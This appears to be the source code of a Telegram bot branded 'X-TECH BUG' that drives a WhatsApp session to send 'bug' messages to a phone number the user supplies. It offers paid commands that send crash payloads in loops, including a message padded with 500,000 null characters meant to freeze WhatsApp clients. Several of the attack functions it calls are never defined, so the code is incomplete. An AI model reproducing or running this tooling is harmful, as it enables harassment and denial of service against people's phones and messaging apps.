const { Telegraf } = require("telegraf");
const fs = require('fs');
const {
    makeWASocket,
    makeInMemoryStore,
    fetchLatestBaileysVersion,
    useMultiFileAuthState,
    DisconnectReason,
} = require("@whiskeysockets/baileys");
const pino = require('pino');
const chalk = require('chalk');
const { BOT_TOKEN, OWNER_ID, allowedGroupIds } = require("./config");
function getGreeting() {
  const hours = new Date().getHours();
  if (hours >= 0 && hours < 12) {
    return "夜明け 🌆";
  } else if (hours >= 12 && hours < 18) {
    return "午後 🌇";
  } else {
    return "夜 🌌";
  }
}
const greeting = getGreeting();
function checkUserStatus(userId) {
  return userId === OWNER_ID ? "OWNER☁️" : "Unknown⛅";
}
function getPushName(ctx) {
  return ctx.from.first_name || "Pengguna";
}

const groupOnlyAccess = allowedGroupIds => {
  return (ctx, next) => {
    if (ctx.chat.type === "group" || ctx.chat.type === "supergroup") {
      if (allowedGroupIds.includes(ctx.chat.id)) {
        return next();
      } else {
        return ctx.reply("🚫 Group Ini Lom Di Kasi Acces Ama Owner");
      }
    } else {
      return ctx.reply("❌ Khusus Group!");
    }
  };
};
const bot = new Telegraf(BOT_TOKEN);
let cay = null;
let isWhatsAppConnected = false;
let linkedWhatsAppNumber = '';
const usePairingCode = true;

const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

const question = (query) => new Promise((resolve) => {
    const rl = require('readline').createInterface({
        input: process.stdin,
        output: process.stdout
    });
    rl.question(query, (answer) => {
        rl.close();
        resolve(answer);
    });
});

const startSesi = async () => {
    const store = makeInMemoryStore({ logger: pino().child({ level: 'silent', stream: 'store' }) });
    const { state, saveCreds } = await useMultiFileAuthState('./session');
    const { version } = await fetchLatestBaileysVersion();

    const connectionOptions = {
        version,
        keepAliveIntervalMs: 30000,
        printQRInTerminal: !usePairingCode,
        logger: pino({ level: "silent" }),
        auth: state,
        browser: ['Mac OS', 'Safari', '10.15.7'],
        getMessage: async (key) => ({
            conversation: 'おさらぎです',
        }),
    };

    cay = makeWASocket(connectionOptions);
    if (usePairingCode && !cay.authState.creds.registered) {
        let phoneNumber = await question(chalk.black(chalk.bgCyan(`\nMasukkan nomor diawali dengan 62:\n`)));
        phoneNumber = phoneNumber.replace(/[^0-9]/g, '');
        const code = await cay.requestPairingCode(phoneNumber.trim());
        const formattedCode = code?.match(/.{1,4}/g)?.join("-") || code;
        console.log(chalk.black(chalk.bgCyan(`Pairing Code: `)), chalk.black(chalk.bgWhite(formattedCode)));
    }

    cay.ev.on('creds.update', saveCreds);
    store.bind(cay.ev);

    cay.ev.on('connection.update', (update) => {
        const { connection, lastDisconnect } = update;

        if (connection === 'open') {
            isWhatsAppConnected = true;
            console.log(chalk.green('WhatsApp berhasil terhubung!'));
        }

        if (connection === 'close') {
            const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
            console.log(
                chalk.red('Koneksi WhatsApp terputus.'),
                shouldReconnect ? 'Mencoba untuk menghubungkan ulang...' : 'Silakan login ulang.'
            );
            if (shouldReconnect) {
                startSesi();
            }
            isWhatsAppConnected = false;
        }
    });
};

startSesi();


const USERS_PREMIUM_FILE = 'usersPremium.json';
let usersPremium = {};
if (fs.existsSync(USERS_PREMIUM_FILE)) {
    usersPremium = JSON.parse(fs.readFileSync(USERS_PREMIUM_FILE, 'utf8'));
} else {
    fs.writeFileSync(USERS_PREMIUM_FILE, JSON.stringify({}));
}

function isPremium(userId) {
    return usersPremium[userId] && usersPremium[userId].premiumUntil > Date.now();
}
function addPremium(userId, duration) {
    const expireTime = Date.now() + duration * 24 * 60 * 60 * 1000; // Durasi dalam hari
    usersPremium[userId] = { premiumUntil: expireTime };
    fs.writeFileSync(USERS_PREMIUM_FILE, JSON.stringify(usersPremium, null, 2));
}
bot.command('statusprem', (ctx) => {
    const userId = ctx.from.id;

    if (isPremium(userId)) {
        const expireDate = new Date(usersPremium[userId].premiumUntil);
        return ctx.reply(`✅ You have premium access.\n🗓 Expiration: ${expireDate.toLocaleString()}`);
    } else {
        return ctx.reply('❌ You do not have premium access.');
    }
});
bot.command('addprem', (ctx) => {
    const ownerId = ctx.from.id.toString();
    if (ownerId !== OWNER_ID) {
        return ctx.reply('❌ You are not authorized to use this command.');
    }

    const args = ctx.message.text.split(' ');
    if (args.length < 3) {
        return ctx.reply('❌ Usage: /addpremium <user_id> <duration_in_days>');
    }

    const targetUserId = args[1];
    const duration = parseInt(args[2]);

    if (isNaN(duration)) {
        return ctx.reply('❌ Invalid duration. It must be a number (in days).');
    }

    addPremium(targetUserId, duration);
    ctx.reply(`✅ User ${targetUserId} has been granted premium access for ${duration} days.`);
});
bot.command('delprem', (ctx) => {
    const ownerId = ctx.from.id.toString();
    if (ownerId !== OWNER_ID) {
        return ctx.reply('❌ You are not authorized to use this command.');
    }

    const args = ctx.message.text.split(' ');
    if (args.length < 2) {
        return ctx.reply('❌ Usage: /deleteprem <user_id>');
    }

    const targetUserId = args[1];

    const wasDeleted = removePremium(targetUserId);

    if (wasDeleted) {
        ctx.reply(`✅ User ${targetUserId} premium access has been removed.`);
    } else {
        ctx.reply(`❌ Failed to remove premium access for user ${targetUserId}.`);
    }
});
function removePremium(userId) {
    console.log(`Removing premium access for user: ${userId}`);
    return true;
}
bot.command('premiumfeature', (ctx) => {
    const userId = ctx.from.id;

    if (!isPremium(userId)) {
        return ctx.reply('❌ This feature is for premium users only. Upgrade to premium to use this command.');
    }

    ctx.reply('🎉 Welcome to the premium-only feature! Enjoy exclusive benefits.');
});
const prosesrespone = (target, ctx) => {
    const photoUrl = 'https://files.catbox.moe/mzr41r.jpg'; // Ganti dengan URL gambar atau gunakan buffer gambar
    const caption = `𝐏𝐫𝐨𝐬𝐞𝐬 𝐘𝐚 𝐁𝐚𝐧𝐠𝐠!`;

    const keyboard = [
        [
            {
                text: "ぢ",
                callback_data: "/menu"
            },
            {
                text: "☁️ Support Owner",
                url: "https://t.me/xtechcorporation2"
            }
        ]
    ];
    ctx.replyWithPhoto(photoUrl, {
        caption: caption,
        reply_markup: {
            inline_keyboard: keyboard
        }
    }).then(() => {
        console.log('Proses response sent');
    }).catch((error) => {
        console.error('Error sending process response:', error);
    });
};

const donerespone = (target, ctx) => {
    const photoUrl = 'https://files.catbox.moe/mzr41r.jpg'; // Ganti dengan URL gambar atau gunakan buffer gambar
    const caption = `𝙎𝙚𝙣𝙙𝙞𝙣𝙜 𝘽𝙪𝙜 𝙏𝙤 ${target} 𝗮𝘀 𝗺𝗮𝗻𝘆 𝗮𝘀 50 `;

    const keyboard = [
        [
            {
                text: "ぢ",
                callback_data: "/menu"
            },
            {
                text: "☁️ Support Owner",
                url: "https://t.me/xtechcorporation2"
            }
        ]
    ];
    ctx.replyWithPhoto(photoUrl, {
        caption: caption,
        reply_markup: {
            inline_keyboard: keyboard
        }
    }).then(() => {
        console.log('Done response sent');
    }).catch((error) => {
        console.error('Error sending done response:', error);
    });
};
const checkWhatsAppConnection = (ctx, next) => {
  if (!isWhatsAppConnected) {
    ctx.reply("❌ WhatsApp belum terhubung. Silakan hubungkan dengan Pairing Code terlebih dahulu.");
    return;
  }
  next();
};
const QBug = {
  key: {
    remoteJid: "p",
    fromMe: false,
    participant: "0@s.whatsapp.net"
  },
  message: {
    interactiveResponseMessage: {
      body: {
        text: "Sent",
        format: "DEFAULT"
      },
      nativeFlowResponseMessage: {
        name: "galaxy_message",
        paramsJson: `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"TrashDex Superior\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"devorsixcore@trash.lol\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons${"\0".repeat(500000)}\",\"screen_0_TextInput_1\":\"Anjay\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
        version: 3
      }
    }
  }
};
bot.command("xcbeta", checkWhatsAppConnection, async ctx => {
  const q = ctx.message.text.split(" ")[1]; 
    const userId = ctx.from.id;

   
    if (!isPremium(userId)) {
        return ctx.reply('❌ This feature is for premium users only. Upgrade to premium to use this command.');
    }
  if (!q) {
    return ctx.reply(`Example: commandnya 225×××`);
  }

  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";


  await prosesrespone(target, ctx);


  for (let i = 0; i < 5; i++) {
    await freezefile(target, { ptcp: true });
    await BlankScreen(target, { ptcp: true });
    await freezefile(target, { ptcp: true });
    await BlankScreen(target, { ptcp: true });
    await XeonXRobust(target, { ptcp: true });
  }

  
  await donerespone(target, ctx);

  return ctx.reply('Cek Ae Mas.');
});
bot.command("xcandro", checkWhatsAppConnection, async ctx => {
  const q = ctx.message.text.split(" ")[1]; 
    const userId = ctx.from.id;

   
    if (!isPremium(userId)) {
        return ctx.reply('❌ This feature is for premium users only. Upgrade to premium to use this command.');
    }
  if (!q) {
    return ctx.reply(`Example: commandnya 225×××`);
  }

  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";


  await prosesrespone(target, ctx);


  for (let i = 0; i < 5; i++) {
    await freezefile(target, { ptcp: true });
    await BlankScreen(target, { ptcp: true });
    await freezefile(target, { ptcp: true });
    await BlankScreen(target, { ptcp: true });
    await XeonXRobust(target, { ptcp: true });
    await freezefile(target, { ptcp: true });
  }

  
  await donerespone(target, ctx);

  return ctx.reply('Cek Ae Mas.');
});
bot.command("xcsystemui", checkWhatsAppConnection, async ctx => {
  const q = ctx.message.text.split(" ")[1]; 
    const userId = ctx.from.id;

   
    if (!isPremium(userId)) {
        return ctx.reply('❌ This feature is for premium users only. Upgrade to premium to use this command.');
    }
  if (!q) {
    return ctx.reply(`Example: commandnya 225×××`);
  }

  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";


  await prosesrespone(target, ctx);


  for (let i = 0; i < 5; i++) {
    await crashui2(target, { ptcp: true });
    await BlankScreen(target, { ptcp: true });
    await systemUi(target, { ptcp: true });
    await crashui2(target, { ptcp: true });
    await systemUi(target, { ptcp: true });
    await XeonXRobust(target, { ptcp: true });
  }

  
  await donerespone(target, ctx);

  return ctx.reply('Cek Ae Mas.');
});
bot.command("xciospay", checkWhatsAppConnection, async ctx => {
  const q = ctx.message.text.split(" ")[1]; 
    const userId = ctx.from.id;

   
    if (!isPremium(userId)) {
        return ctx.reply('❌ This feature is for premium users only. Upgrade to premium to use this command.');
    }
  if (!q) {
    return ctx.reply(`Example: commandnya 62×××`);
  }

  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";


  await prosesrespone(target, ctx);


  for (let i = 0; i < 5; i++) {
           await BugIos(target);
  }

  
  await donerespone(target, ctx);

  return ctx.reply('Proses selesai.');
});
bot.command("xciosinvis", checkWhatsAppConnection, async ctx => {
  const q = ctx.message.text.split(" ")[1]; 
    const userId = ctx.from.id;

   
    if (!isPremium(userId)) {
        return ctx.reply('❌ This feature is for premium users only. Upgrade to premium to use this command.');
    }
  if (!q) {
    return ctx.reply(`Example: commandnya 62×××`);
  }

  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";


  await prosesrespone(target, ctx);


  for (let i = 0; i < 5; i++) {
           await BugIos(target);
  }

  
  await donerespone(target, ctx);

  return ctx.reply('Proses selesai.');
});

bot.start(ctx => {
  const menuMessage = `
   👋 Hello Unknown, I am the 𝙏𝙚𝙡𝙚𝙜𝙧𝙖𝙢 𝘽𝙤𝙩  created by X-TECH. I'm here to assist you with anything you might need, making your interaction smoother and more efficient.       
Selamat ${greeting} !
━━━━━━━━━━━━━━━━━━━━━
「  𝐒 𝐔 𝐁 𝐌 𝐄 𝐍 𝐔 」
▢ /menu
▢ /ownermenu
▢ /thanksto
⟣──────────
> © X-TECH BUG 1.0
`;

  const photoUrl = "https://files.catbox.moe/mzr41r.jpg"; 


  const keyboard = [[{
    text: "ぢ",
    callback_data: "/menu"
  },
  {
    text: "☁️ Support Owner",
    url: "https://t.me/xtechcorporation2"
  } 
  ]];

  
  ctx.replyWithPhoto(photoUrl, {
    caption: menuMessage,
    reply_markup: {
      inline_keyboard: keyboard
    }
  });
});
//Menu Awal
bot.command("menu", ctx => {
  const menu = `
   👋 Hello Unknown, I am the 𝙏𝙚𝙡𝙚𝙜𝙧𝙖𝙢 𝘽𝙤𝙩  created by @xtechcorporation2 I'm here to assist you with anything you might need, making your interaction smoother and more efficient.       
Selamat ${greeting} !
ᝄ ⌜ 𝘽 𝙐 𝙂 𝙈 𝙀 𝙉 𝙐 ⌟
䒘 > /xcbeta
䒘 > /xiosinvis
䒘 > /xcandro
䒘 > /xciospay
䒘 > /xcsystemui
⟣──────────
> © 𝗦𝘁𝗮𝗿𝗲𝘃𝘅𝘇 2.1
    `;

  const keyboard = [[{
    text: "Contact Owner",
    url: "https://t.me/xtechcorporation2"
  }]];

  ctx.replyWithPhoto("https://files.catbox.moe/mzr41r.jpg", {
    caption: menu,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: keyboard
    }
  }).then(() => {
    ctx.replyWithAudio({
      url: "https://files.catbox.moe/4yt76r.mp3" 
    });
  });
});
bot.command("ownermenu", ctx => {
  const menu = `
   👋 Hello Unknown, I am the 𝙏𝙚𝙡𝙚𝙜𝙧𝙖𝙢 𝘽𝙤𝙩  created by @xtechcorporation2. I'm here to assist you with anything you might need, making your interaction smoother and more efficient.       
Selamat ${greeting} !
ᝄ ⌜ 𝙊 𝙬 𝙣 𝙚 𝙧 𝙈 𝙚 𝙣 𝙪 ⌟
䒘 > /delprem
䒘 > /addprem
䒘 > /statusprem
䒘 > /status
⟣──────────
> © 𝗦𝘁𝗮𝗿𝗲𝘃𝘅𝘇 2.1
    `;

  const keyboard = [[{
    text: "Contact Owner",
    url: "https://t.me/xtechcorporation2"
  }]];

  ctx.replyWithPhoto("https://files.catbox.moe/mzr41r.jpg", {
    caption: menu,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: keyboard
    }
  }).then(() => {
    ctx.replyWithAudio({
      url: "https://files.catbox.moe/4yt76r.mp3" 
    });
  });
});
// Function Bug
bot.command("status", ctx => {
  if (isWhatsAppConnected) {
    ctx.reply(`✅ WhatsApp terhubung dengan nomor: ${linkedWhatsAppNumber || "Tidak diketahui"}`);
  } else {
    ctx.reply("❌ WhatsApp belum terhubung.");
  }
});

//function bug
bot.launch();
console.log("Telegram bot is running...");
setInterval(() => {
    const now = Date.now();
    Object.keys(usersPremium).forEach(userId => {
        if (usersPremium[userId].premiumUntil < now) {
            delete usersPremium[userId];
        }
    });
    Object.keys(botSessions).forEach(botToken => {
        if (botSessions[botToken].expiresAt < now) {
            delete botSessions[botToken];
        }
    });
    fs.writeFileSync(USERS_PREMIUM_FILE, JSON.stringify(usersPremium));
}, 60 * 60 * 1000); // Check every hour
